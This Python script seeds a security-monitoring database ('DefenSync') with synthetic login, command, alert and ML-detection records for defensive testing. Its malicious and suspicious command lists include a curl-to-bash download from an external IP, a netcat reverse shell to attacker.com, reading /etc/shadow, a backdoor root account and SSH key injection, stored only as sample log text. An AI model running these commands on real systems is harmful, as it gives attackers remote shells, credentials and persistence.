#!/usr/bin/env python3
"""
Seed DefenSync PostgreSQL with realistic synthetic cybersecurity telemetry.

Detects the configured database automatically (PostgreSQL via SQLAlchemy),
uses existing ORM models and IngestionService, and never modifies the schema
or deletes existing records.
"""

from __future__ import annotations

import argparse
import json
import random
import sys
import uuid
from collections import Counter
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from dotenv import load_dotenv

load_dotenv()

from sqlalchemy import func, inspect, select

from backend.core.config import get_settings
from backend.database import crud
from backend.database.connection import get_engine, get_session
from backend.database.models import Alert, CollectionRun, Detection, SecurityEvent, Server, User
from backend.risk.levels import risk_level_from_score
from backend.services.ingestion_service import IngestionService

# ---------------------------------------------------------------------------
# Scenario profiles
# ---------------------------------------------------------------------------

LINUX_DISTROS = [
    "Ubuntu 22.04 LTS",
    "Ubuntu 20.04 LTS",
    "CentOS 7",
    "CentOS Stream 9",
    "RHEL 8.9",
    "Debian 12",
    "Amazon Linux 2023",
    "Rocky Linux 9.2",
]

LINUX_USERS = [
    "admin", "devops", "jsmith", "akumar", "svc_backup", "deploy", "monitor",
    "dba", "jenkins", "ansible", "root", "ubuntu", "ec2-user", "azureuser",
]

INTERNAL_IPS = [f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}" for _ in range(40)]
INTERNAL_IPS += [f"192.168.{random.randint(1, 20)}.{random.randint(1, 254)}" for _ in range(40)]
EXTERNAL_IPS = [
    "203.0.113.44", "198.51.100.17", "45.33.32.156", "185.220.101.42",
    "91.219.237.90", "103.152.112.88", "172.16.254.1", "8.8.8.8",
]

EVENT_TYPES = {
    "Successful Login": ("authentication", "Successful Login"),
    "Failed Login": ("authentication", "Failed Login"),
    "Invalid User": ("authentication", "Invalid User"),
    "Sudo Command": ("privilege", "Sudo Command"),
    "Command Execution": ("process", "Command Execution"),
    "File Modification": ("file_system", "File Modification"),
    "File Creation": ("file_system", "File Creation"),
    "File Deletion": ("file_system", "File Deletion"),
    "Permission Change": ("file_system", "Permission Change"),
    "User Creation": ("identity", "User Creation"),
    "Directory Creation": ("file_system", "Directory Creation"),
}

FALSE_POSITIVE_COMMANDS = [
    ("apt-get upgrade -y", "apt", "Scheduled package upgrade completed"),
    ("docker pull nginx:latest", "docker", "Docker image pull during deployment"),
    ("kubectl apply -f deployment.yaml", "kubectl", "Kubernetes rollout applied"),
    ("az backup restore --vault-name prod-vault", "az", "Azure backup restore job"),
    ("git clone https://github.com/org/app.git", "git", "Git clone for CI pipeline"),
    ("rsync -av /data /backup/nightly", "rsync", "Nightly backup synchronization"),
    ("yum install -y security-updates", "yum", "System patch installation"),
    ("helm upgrade monitoring prometheus-community/kube-prometheus-stack", "helm", "Helm chart upgrade"),
]

MALICIOUS_COMMANDS = [
    ("curl http://185.220.101.42/rev.sh | bash", "bash", "Reverse shell download attempt"),
    ("./xmrig --donate-level 1 -o pool.minexmr.com:4444", "xmrig", "Crypto-mining process execution"),
    ("chmod +s /usr/bin/python3", "chmod", "SUID privilege escalation attempt"),
    ("useradd -o -u 0 backdoor", "useradd", "Duplicate UID backdoor account"),
    ("nc -e /bin/bash attacker.com 4444", "nc", "Netcat reverse shell"),
    ("echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys", "bash", "Unauthorized SSH key injection"),
]

SUSPICIOUS_COMMANDS = [
    ("sudo su -", "sudo", "Interactive root escalation after hours"),
    ("find / -perm -4000 2>/dev/null", "find", "SUID enumeration"),
    ("cat /etc/shadow", "cat", "Sensitive credential file access"),
    ("wget http://unknown-host/payload.sh", "wget", "External payload retrieval"),
]


@dataclass
class GenerationStats:
    events_requested: int = 0
    events_inserted: int = 0
    events_duplicates: int = 0
    events_failed: int = 0
    alerts_inserted: int = 0
    detections_inserted: int = 0
    collection_runs_inserted: int = 0
    scenarios: Counter = field(default_factory=Counter)
    severities: Counter = field(default_factory=Counter)
    iso_labels: Counter = field(default_factory=Counter)
    rf_labels: Counter = field(default_factory=Counter)
    typing_speeds: list[float] = field(default_factory=list)
    cpu_usages: list[float] = field(default_factory=list)


def detect_database() -> dict[str, Any]:
    """Detect database engine, URL, and table list."""
    settings = get_settings()
    engine = get_engine()
    inspector = inspect(engine)
    dialect = engine.dialect.name
    tables = inspector.get_table_names()
    return {
        "dialect": dialect,
        "url": engine.url.render_as_string(hide_password=True),
        "database": settings.DB_NAME,
        "host": settings.DB_HOST,
        "port": settings.DB_PORT,
        "orm": "SQLAlchemy",
        "tables": tables,
    }


def _rand_ts(start: datetime, end: datetime) -> datetime:
    delta = end - start
    seconds = random.randint(0, int(delta.total_seconds()))
    ts = start + timedelta(seconds=seconds)
    return ts.replace(microsecond=random.randint(0, 999999), tzinfo=timezone.utc)


def _behavior_metrics(
    *,
    scenario: str,
    session_minutes: float,
) -> dict[str, Any]:
    if scenario == "malicious":
        wpm = random.uniform(185, 320)
        paste = random.random() < 0.85
        inter_key = random.uniform(0, 15)
        idle = random.uniform(5, 120)
        backspace = random.randint(0, 2)
        behavior_score = random.randint(15, 45)
        iso = "Anomaly"
        rf = random.choice(["Attack", "Bot", "Script", "Insider Threat"])
    elif scenario == "suspicious":
        wpm = random.uniform(95, 175)
        paste = random.random() < 0.35
        inter_key = random.uniform(20, 80)
        idle = random.uniform(600, 3600)
        backspace = random.randint(3, 20)
        behavior_score = random.randint(45, 68)
        iso = random.choice(["Normal", "Anomaly"])
        rf = "Suspicious"
    elif scenario == "false_positive":
        wpm = random.uniform(40, 75)
        paste = random.random() < 0.5
        inter_key = random.uniform(80, 180)
        idle = random.uniform(30, 300)
        backspace = random.randint(1, 8)
        behavior_score = random.randint(70, 88)
        iso = random.choice(["Normal", "Anomaly"])
        rf = random.choice(["Human", "Suspicious"])
    elif scenario == "false_negative":
        wpm = random.uniform(38, 72)
        paste = False
        inter_key = random.uniform(90, 160)
        idle = random.uniform(120, 900)
        backspace = random.randint(0, 5)
        behavior_score = random.randint(62, 78)
        iso = "Normal"
        rf = "Human"
    else:  # normal
        wpm = random.uniform(35, 80)
        paste = random.random() < 0.05
        inter_key = random.uniform(100, 250)
        idle = random.uniform(60, 1800)
        backspace = random.randint(0, 6)
        behavior_score = random.randint(75, 98)
        iso = "Normal"
        rf = "Human"

    cps = round(wpm * 5 / 60, 2)
    cmd_time = random.uniform(80, 2500) if scenario != "malicious" else random.uniform(20, 400)
    return {
        "typing_speed_wpm": round(wpm, 1),
        "characters_per_second": cps,
        "avg_inter_key_delay_ms": round(inter_key, 1),
        "idle_time_seconds": round(idle, 1),
        "backspace_count": backspace,
        "paste_detected": paste,
        "command_execution_time_ms": round(cmd_time, 1),
        "session_duration_minutes": round(session_minutes, 1),
        "behavior_score": behavior_score,
        "isolation_forest_label": iso,
        "random_forest_label": rf,
    }


def _system_metrics(scenario: str) -> dict[str, float]:
    if scenario == "malicious":
        return {
            "cpu_usage": round(random.uniform(78, 99), 1),
            "memory_usage": round(random.uniform(70, 96), 1),
            "disk_usage": round(random.uniform(55, 92), 1),
            "network_connections": random.randint(80, 500),
            "commands_executed": random.randint(120, 800),
        }
    if scenario == "suspicious":
        return {
            "cpu_usage": round(random.uniform(45, 78), 1),
            "memory_usage": round(random.uniform(40, 75), 1),
            "disk_usage": round(random.uniform(35, 70), 1),
            "network_connections": random.randint(25, 120),
            "commands_executed": random.randint(30, 150),
        }
    if scenario in {"false_positive", "false_negative"}:
        return {
            "cpu_usage": round(random.uniform(35, 72), 1),
            "memory_usage": round(random.uniform(30, 65), 1),
            "disk_usage": round(random.uniform(40, 80), 1),
            "network_connections": random.randint(10, 80),
            "commands_executed": random.randint(15, 90),
        }
    return {
        "cpu_usage": round(random.uniform(5, 35), 1),
        "memory_usage": round(random.uniform(15, 55), 1),
        "disk_usage": round(random.uniform(20, 60), 1),
        "network_connections": random.randint(1, 25),
        "commands_executed": random.randint(1, 40),
    }


def _pick_scenario() -> str:
    roll = random.random()
    if roll < 0.75:
        inner = random.random()
        if inner < 0.04:
            return "false_positive"
        if inner < 0.07:
            return "false_negative"
        return "normal"
    if roll < 0.90:
        return "suspicious"
    return "malicious"


def _risk_for_scenario(scenario: str) -> tuple[int, str]:
    if scenario == "malicious":
        score = random.randint(85, 100)
        severity = random.choice(["critical", "high"])
    elif scenario == "suspicious":
        score = random.randint(55, 84)
        severity = random.choice(["medium", "high"])
    elif scenario == "false_positive":
        score = random.randint(62, 79)
        severity = random.choice(["medium", "high"])
    elif scenario == "false_negative":
        score = random.randint(25, 55)
        severity = random.choice(["low", "medium"])
    else:
        score = random.randint(5, 45)
        severity = random.choice(["info", "low", "medium"])
    return score, severity


def _build_event_payload(
    *,
    server: Server,
    scenario: str,
    ts: datetime,
    seq: int,
) -> dict[str, Any]:
    session_id = uuid.uuid4().hex[:16]
    linux_user = random.choice(LINUX_USERS)
    distro = random.choice(LINUX_DISTROS)
    hostname = server.server_name.replace(" ", "-").lower()
    ip = random.choice(EXTERNAL_IPS if scenario == "malicious" else INTERNAL_IPS)

    session_minutes = random.uniform(5, 480)
    metrics = _system_metrics(scenario)
    behavior = _behavior_metrics(scenario=scenario, session_minutes=session_minutes)
    risk_score, severity = _risk_for_scenario(scenario)

    failed_logins = 0
    login_time = ts
    logout_time = ts + timedelta(minutes=session_minutes)
    command = None
    process = "sshd"
    event_type = "Successful Login"
    category = "authentication"
    message = f"Accepted publickey for {linux_user} from {ip} port 22 ssh2"

    if scenario == "normal":
        if random.random() < 0.35:
            event_type = "Command Execution"
            category = "process"
            cmd = random.choice(["ls -la /var/log", "systemctl status nginx", "tail -f /var/log/syslog", "df -h", "ps aux"])
            command, process = cmd, cmd.split()[0]
            message = f"{linux_user} executed: {cmd}"
        elif random.random() < 0.15:
            event_type = "Sudo Command"
            category = "privilege"
            command = "/usr/bin/systemctl restart nginx"
            process = "sudo"
            message = f"{linux_user} : TTY=pts/0 ; USER=root ; COMMAND={command}"
            risk_score = max(risk_score, random.randint(35, 55))
    elif scenario == "suspicious":
        hour = ts.hour
        if hour < 6 or hour > 22:
            risk_score = min(100, risk_score + 10)
        failed_logins = random.randint(2, 8)
        if random.random() < 0.5:
            event_type = "Failed Login"
            category = "authentication"
            message = f"Failed password for {linux_user} from {ip} port 22 ssh2"
            severity = "high" if failed_logins > 4 else "medium"
        else:
            event_type = "Command Execution"
            category = "process"
            command, process, message = random.choice(SUSPICIOUS_COMMANDS)
            message = f"{linux_user} executed suspicious command: {command}"
    elif scenario == "malicious":
        failed_logins = random.randint(5, 50)
        choice = random.random()
        if choice < 0.35:
            event_type = "Failed Login"
            category = "authentication"
            message = f"Failed password for invalid user {random.choice(['admin','root','test','oracle'])} from {ip}"
        elif choice < 0.55:
            event_type = "Invalid User"
            category = "authentication"
            message = f"Invalid user {random.choice(['administrator','backup','guest'])} from {ip}"
        else:
            event_type = "Command Execution"
            category = "process"
            command, process, message = random.choice(MALICIOUS_COMMANDS)
            message = f"{linux_user} executed: {command} [{message}]"
    elif scenario == "false_positive":
        command, process, message = random.choice(FALSE_POSITIVE_COMMANDS)
        event_type = "Command Execution"
        category = "process"
        message = f"Automation job by {linux_user}: {message}"
    else:  # false_negative
        event_type = random.choice(["Successful Login", "Command Execution", "File Modification"])
        category = EVENT_TYPES[event_type][0]
        if event_type == "Command Execution":
            command = "scp sensitive-db-dump.sql backup@10.0.5.20:/archive/"
            process = "scp"
            message = f"{linux_user} transferred archive file during maintenance window"
        else:
            message = f"Accepted password for {linux_user} from {ip} port 22 ssh2"

    normalized = {
        "session_id": session_id,
        "linux_distribution": distro,
        "scenario": scenario,
        "behavior": behavior,
        "network": {
            "source_ip": ip,
            "destination_port": random.choice([22, 443, 8080, 4444, 53]),
            "protocol": random.choice(["tcp", "tcp", "tcp", "udp"]),
            "bytes_out": random.randint(500, 500000 if scenario == "malicious" else 50000),
        },
        "process_activity": {
            "process": process,
            "parent_process": random.choice(["sshd", "bash", "systemd", "cron"]),
            "pid": random.randint(1000, 65000),
        },
    }

    raw = (
        f"{ts.strftime('%b %d %H:%M:%S')} {hostname} {process}[{random.randint(1000, 99999)}]: "
        f"{message} session={session_id} seq={seq} uid={random.randint(1000, 65534)}"
    )

    return {
        "event_id": str(uuid.uuid4()),
        "server_id": server.id,
        "owner_id": server.owner_id or server.created_by,
        "timestamp": ts.isoformat(),
        "hostname": hostname,
        "username": linux_user,
        "source_ip": ip,
        "event_type": event_type,
        "category": category,
        "severity": severity,
        "risk_score": risk_score,
        "risk_level": risk_level_from_score(risk_score),
        "command": command,
        "process": process,
        "message": message,
        "raw_log": raw,
        "normalized_data": json.dumps(normalized, default=str),
        "cpu_usage": metrics["cpu_usage"],
        "memory_usage": metrics["memory_usage"],
        "disk_usage": metrics["disk_usage"],
        "network_connections": metrics["network_connections"],
        "commands_executed": metrics["commands_executed"],
        "failed_login_count": failed_logins,
        "session_duration": round(session_minutes * 60, 1),
        "login_time": login_time.isoformat(),
        "logout_time": logout_time.isoformat(),
        "_scenario": scenario,
        "_behavior": behavior,
    }


def _load_servers_and_users(session) -> tuple[list[Server], list[User]]:
    servers = list(session.scalars(select(Server)).all())
    users = list(session.scalars(select(User)).all())
    return servers, users


def _insert_alerts(session, events: list[dict[str, Any]], stats: GenerationStats) -> None:
    existing_alert_events = set(session.scalars(select(Alert.event_id)).all())
    for payload in events:
        if payload["risk_score"] < 70:
            continue
        event_id = payload["event_id"]
        if event_id in existing_alert_events:
            continue
        behavior = payload["_behavior"]
        detection_type = "rule_based"
        if behavior["isolation_forest_label"] == "Anomaly" or behavior["random_forest_label"] not in {"Human", "normal"}:
            detection_type = "ml_anomaly" if payload["risk_score"] < 85 else "hybrid"
        session.add(
            Alert(
                event_id=event_id,
                server_id=payload.get("server_id"),
                owner_id=payload.get("owner_id"),
                title=f"{payload['event_type']} on {payload['hostname']}",
                message=payload["message"],
                severity=payload["severity"],
                risk_score=payload["risk_score"],
                risk_level=payload.get("risk_level"),
                detection_type=detection_type,
                acknowledged=random.random() < 0.12,
                created_at=_parse_dt(payload["timestamp"]),
            )
        )
        existing_alert_events.add(event_id)
        stats.alerts_inserted += 1
    session.commit()


def _insert_detections(session, events: list[dict[str, Any]], stats: GenerationStats) -> None:
    existing = set(session.scalars(select(Detection.event_id)).all())
    rows: list[Detection] = []
    for payload in events:
        event_id = payload["event_id"]
        if event_id in existing:
            continue
        behavior = payload["_behavior"]
        scenario = payload["_scenario"]
        iso_label = behavior["isolation_forest_label"]
        rf_label = behavior["random_forest_label"]

        if scenario == "malicious":
            classification = "Malicious"
            is_anomaly = True
        elif scenario in {"suspicious", "false_positive"} or iso_label == "Anomaly":
            classification = "Suspicious"
            is_anomaly = iso_label == "Anomaly"
        elif scenario == "false_negative":
            classification = "Normal"
            is_anomaly = False
        else:
            classification = "Normal"
            is_anomaly = False

        iso_score = round(random.uniform(0.55, 0.99 if is_anomaly else 0.35), 3)
        rf_db_label = "suspicious" if rf_label not in {"Human", "normal"} else "normal"

        rows.append(
            Detection(
                server_id=payload["server_id"],
                owner_id=payload.get("owner_id"),
                event_id=event_id,
                isolation_score=iso_score,
                random_forest_label=rf_db_label,
                classification=classification,
                confidence=round(min(0.99, max(0.5, iso_score)), 3),
                detection_type="hybrid" if is_anomaly and rf_db_label == "suspicious" else (
                    "isolation_forest" if is_anomaly else "random_forest" if rf_db_label == "suspicious" else "normal"
                ),
                message=f"IF={iso_label} RF={rf_label}: {payload['message'][:180]}",
                is_anomaly=is_anomaly,
                risk_score=payload["risk_score"],
                created_at=_parse_dt(payload["timestamp"]),
            )
        )
        stats.detections_inserted += 1
        stats.iso_labels[iso_label] += 1
        stats.rf_labels[rf_label] += 1
        existing.add(event_id)

    if rows:
        session.add_all(rows)
        session.commit()


def _insert_collection_runs(session, servers: list[Server], stats: GenerationStats, *, count: int = 24) -> None:
    now = datetime.now(timezone.utc)
    for i in range(count):
        server = random.choice(servers)
        started = now - timedelta(days=random.randint(1, 28), hours=random.randint(0, 23))
        processed = random.randint(200, 1200)
        inserted = random.randint(int(processed * 0.6), processed)
        duration = random.randint(800, 12000)
        session.add(
            CollectionRun(
                server_id=server.id,
                status=random.choice(["completed", "completed", "completed", "failed"]),
                processed=processed,
                inserted=inserted,
                duplicates=processed - inserted,
                failed=random.randint(0, 5),
                skipped=random.randint(0, 20),
                duration_ms=duration,
                started_at=started,
                completed_at=started + timedelta(milliseconds=duration),
            )
        )
        stats.collection_runs_inserted += 1
    session.commit()


def _parse_dt(value: str | datetime) -> datetime:
    if isinstance(value, datetime):
        return value if value.tzinfo else value.replace(tzinfo=timezone.utc)
    parsed = datetime.fromisoformat(str(value).replace("Z", "+00:00"))
    return parsed if parsed.tzinfo else parsed.replace(tzinfo=timezone.utc)


def generate_events(servers: list[Server], count: int) -> list[dict[str, Any]]:
    if not servers:
        raise RuntimeError("No servers found. Register at least one server before seeding telemetry.")

    end = datetime.now(timezone.utc)
    start = end - timedelta(days=28)
    payloads: list[dict[str, Any]] = []
    for seq in range(count):
        server = random.choice(servers)
        scenario = _pick_scenario()
        ts = _rand_ts(start, end)
        payload = _build_event_payload(server=server, scenario=scenario, ts=ts, seq=seq)
        payloads.append(payload)
    payloads.sort(key=lambda item: item["timestamp"])
    return payloads


def ingest_events(session, payloads: list[dict[str, Any]], stats: GenerationStats, *, batch_size: int = 400) -> list[dict[str, Any]]:
    service = IngestionService(session)
    inserted_payloads: list[dict[str, Any]] = []
    clean = [{k: v for k, v in p.items() if not k.startswith("_")} for p in payloads]

    for offset in range(0, len(clean), batch_size):
        batch = clean[offset : offset + batch_size]
        meta_batch = payloads[offset : offset + batch_size]
        result = service.ingest_bulk_events(batch)
        stats.events_inserted += result["inserted"]
        stats.events_duplicates += result["duplicates"]
        stats.events_failed += result["failed"]

        batch_ids = [item["event_id"] for item in meta_batch]
        persisted_ids = crud.get_existing_event_ids(session, batch_ids)
        for item in meta_batch:
            if item["event_id"] not in persisted_ids:
                continue
            inserted_payloads.append(item)
            stats.scenarios[item["_scenario"]] += 1
            stats.severities[item["severity"]] += 1
            stats.typing_speeds.append(item["_behavior"]["typing_speed_wpm"])
            stats.cpu_usages.append(item["cpu_usage"])

    return inserted_payloads


def verify_database(session, stats: GenerationStats) -> dict[str, int]:
    return {
        "users": session.scalar(select(func.count(User.id))) or 0,
        "servers": session.scalar(select(func.count(Server.id))) or 0,
        "events": session.scalar(select(func.count(SecurityEvent.id))) or 0,
        "alerts": session.scalar(select(func.count(Alert.id))) or 0,
        "detections": session.scalar(select(func.count(Detection.id))) or 0,
        "collection_runs": session.scalar(select(func.count(CollectionRun.id))) or 0,
    }


def print_summary(db_info: dict[str, Any], stats: GenerationStats, totals: dict[str, int]) -> None:
    avg_wpm = round(sum(stats.typing_speeds) / len(stats.typing_speeds), 1) if stats.typing_speeds else 0
    avg_cpu = round(sum(stats.cpu_usages) / len(stats.cpu_usages), 1) if stats.cpu_usages else 0

    print("\n" + "=" * 72)
    print("DefenSync Synthetic Telemetry Seed Summary")
    print("=" * 72)
    print(f"Database engine : {db_info['dialect'].upper()} (ORM: {db_info['orm']})")
    print(f"Connection      : {db_info['url']}")
    print(f"Tables detected : {', '.join(db_info['tables'])}")
    print("-" * 72)
    print(f"Events requested      : {stats.events_requested:,}")
    print(f"Events inserted (new) : {stats.events_inserted:,}")
    print(f"Events skipped (dup)  : {stats.events_duplicates:,}")
    print(f"Events failed         : {stats.events_failed:,}")
    print(f"Alerts inserted (new) : {stats.alerts_inserted:,}")
    print(f"Detections inserted   : {stats.detections_inserted:,}")
    print(f"Collection runs added : {stats.collection_runs_inserted:,}")
    print("-" * 72)
    print("Scenario distribution (inserted events):")
    for key in ["normal", "suspicious", "malicious", "false_positive", "false_negative"]:
        print(f"  {key:16}: {stats.scenarios.get(key, 0):,}")
    print("-" * 72)
    print(f"Average typing speed  : {avg_wpm} WPM")
    print(f"Average CPU usage     : {avg_cpu}%")
    print("Isolation Forest label distribution (new detections):")
    for label, count in stats.iso_labels.most_common():
        print(f"  {label:16}: {count:,}")
    print("Random Forest label distribution (new detections):")
    for label, count in stats.rf_labels.most_common():
        print(f"  {label:16}: {count:,}")
    print("-" * 72)
    print("Database totals after seed (existing + new):")
    for key, value in totals.items():
        print(f"  {key:16}: {value:,}")
    print("=" * 72)


def main() -> int:
    parser = argparse.ArgumentParser(description="Seed DefenSync with synthetic cybersecurity telemetry.")
    parser.add_argument(
        "--count",
        type=int,
        default=7000,
        help="Number of security events to generate (default: 7000, range 5000-10000 recommended).",
    )
    parser.add_argument(
        "--collection-runs",
        type=int,
        default=24,
        help="Number of synthetic collection run records to add.",
    )
    parser.add_argument(
        "--skip-alerts",
        action="store_true",
        help="Skip alert generation.",
    )
    parser.add_argument(
        "--skip-detections",
        action="store_true",
        help="Skip ML detection record generation.",
    )
    args = parser.parse_args()

    if not 5000 <= args.count <= 10000:
        print(f"Warning: --count {args.count} is outside recommended 5000-10000 range; proceeding anyway.")

    db_info = detect_database()
    if db_info["dialect"] != "postgresql":
        print(f"Expected PostgreSQL but detected '{db_info['dialect']}'. Aborting to avoid schema mismatch.")
        return 1

    print(f"Detected {db_info['dialect'].upper()} database at {db_info['url']}")
    print(f"Tables: {', '.join(db_info['tables'])}")

    session = get_session()
    stats = GenerationStats(events_requested=args.count)
    try:
        servers, users = _load_servers_and_users(session)
        if not servers:
            print("ERROR: No servers registered. Add servers via the UI before seeding.")
            return 1
        if not users:
            print("ERROR: No users found.")
            return 1

        print(f"Using {len(servers)} server(s) and {len(users)} existing user account(s).")
        print(f"Generating {args.count:,} synthetic events...")

        payloads = generate_events(servers, args.count)
        inserted_meta = ingest_events(session, payloads, stats)

        if not args.skip_alerts:
            _insert_alerts(session, inserted_meta, stats)
        if not args.skip_detections:
            _insert_detections(session, inserted_meta, stats)
        if args.collection_runs > 0:
            _insert_collection_runs(session, servers, stats, count=args.collection_runs)

        totals = verify_database(session, stats)
        print_summary(db_info, stats, totals)
        return 0
    except Exception as exc:
        session.rollback()
        print(f"Seed failed: {exc}", file=sys.stderr)
        raise
    finally:
        session.close()


if __name__ == "__main__":
    raise SystemExit(main())
